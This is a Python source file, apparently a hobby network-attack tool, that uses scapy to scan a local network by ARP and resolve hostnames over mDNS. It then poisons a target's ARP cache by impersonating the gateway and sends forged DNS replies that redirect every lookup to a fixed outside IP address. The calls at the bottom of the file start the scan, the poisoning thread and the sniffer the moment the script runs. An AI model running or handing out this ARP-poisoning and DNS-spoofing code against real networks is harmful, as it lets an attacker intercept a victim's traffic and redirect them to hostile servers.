from pprint import pprint
import tkinter
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from tkinter import ttk
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send, sniff, sr1
import threading
import time
import ipaddress
import macaddress
from tkinter import *


def arp_scan(ip_range):
    devices = []
    ether_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range)
    answer = srp(ether_packet, timeout=1 ,verbose=False)[0]
    for send,received in answer:
        devices.append({"ip":  received.psrc,"mac":received.hwsrc})
    return devices

def mdns_scan(ip_hostname_check):
    dns_packet = IP(dst="224.0.0.251")/UDP(dport=5353)/DNS(rd=1,qd=DNSQR(qname=".".join(ip_hostname_check[::-1])+".in-addr.arpa",qtype="PTR"))
    while True:
        response_hostname = sr1(dns_packet, timeout=2, verbose=False)
        if response_hostname:
            if response_hostname.haslayer(DNSRR):
                hostname = response_hostname[DNSRR].rdata.decode('utf-8')
                print(hostname)
                return hostname
        else:
            print("No response")



#mdns_scan("10.0.0.5")


def input_ip():
    target_ip = input("Enter range or ip you want to target: ")
    validation = validition_ip(target_ip)
    return validation

def input_mac():
    target_mac = input("Enter the mac address of the target: ")
    valid_mac = is_mac_valid(target_mac)
    return valid_mac


def validition_ip(target_ip_check):
        try:
            valid_ip = str(ipaddress.ip_address(target_ip_check))
            print(f"Ip {valid_ip} is valid.")
            return valid_ip
        except ValueError:
            try:
                valid_range_ip = str(ipaddress.ip_network(target_ip_check))
                print(f"{valid_range_ip} is a valid ip range.")
                return valid_range_ip
            except ValueError:
                print(f"The ip {target_ip_check} is not a valid ip... please try again")

def is_mac_valid(target_mac_check):
    while True:
        try:
            valid_mac = str(macaddress.MAC(target_mac_check))
            print(f"{valid_mac} is a valid mac.")
            return valid_mac
        except ValueError:
            print(f"{valid_mac} is not a valid mac.")
            target_mac_check = input("Enter a valid mac: ")



def arp_poisoning(target_ip_for_arp_poisoning, target_mac_for_arp_poisoning):
    while True:
        arp_replay = ARP(op=2, pdst=target_ip_for_arp_poisoning, hwdst=target_mac_for_arp_poisoning, psrc="10.0.0.138")
        send(arp_replay, verbose=False)
        time.sleep(3)




def make_thread(target_ip,target_mac):
    arp_poisoning_thread = threading.Thread(target=arp_poisoning, args=(target_ip, target_mac))
    arp_poisoning_thread.start()




def dns_spoofing(packet):
    print(packet.summary())
    ip = '34.149.27.89'
    if packet.haslayer(DNS):
        print("DNS packet detected")
        if packet[DNS].qr == 0:
            print(packet[DNS].qr)
            print("Dns req")
            transaction_id = packet[DNS].id
            domain_name = packet[DNSQR].qname
            dns_spoffed_packet = (IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=53)/
                                  DNS(id=transaction_id,
                                  qr=1,qd=DNSQR(qname=domain_name),
                                  an=DNSRR(rdata=ip,rrname=domain_name)))

            send(dns_spoffed_packet, verbose=0)
        else:
            print("Dns res")

#10.0.0.0/24




def capture_packets(target):
    sniff(filter=f"host {target}", prn=dns_spoofing)





print(arp_scan('10.0.0.0/24'))
make_thread( '10.0.0.10','x')
capture_packets('10.0.0.10')




def gui_interface():

    root = Tk()
    root.title("Arp")
    root.geometry("900x650")

    frm = ttk.Frame(root, padding= 5)
    frm.grid()

    label_arp = Label(frm, text="Arp scan", font=("Arial", 24))
    label_arp.grid(row=0 , column=4)

    global entry_ip
    entry_ip = Entry(frm)
    entry_ip.grid(row=1, column=4, padx=3, pady=3, sticky="w")

    global result_label
    result_label = Label(frm, text="")
    result_label.grid(row=3 ,column=4)

    button_start_scan = Button(frm, text="Start scan", command=save_text)
    root.bind('<Return>', lambda event: button_start_scan.invoke())
    button_start_scan.grid(row=2 , column=4)

    describe_label = Label(frm, text="Ip or Ip range: ")
    describe_label.grid(row=1, column=3, padx=5, pady=5, sticky="e")

    global show_ip
    show_ip = Text(frm, height=20, width= 70)
    show_ip.grid(row =4 , column= 4)

    root.mainloop()


def save_text():
    get_text = entry_ip.get()
    validated_ip = validition_ip(get_text)
    if validated_ip:
        result_label.config(text="proccing ip...")
        network = arp_scan(validated_ip)
        show_ip.insert(tkinter.END,network)

        pprint(network)
    else:
        result_label.config(text="not a valid ip.")



#gui_interface()


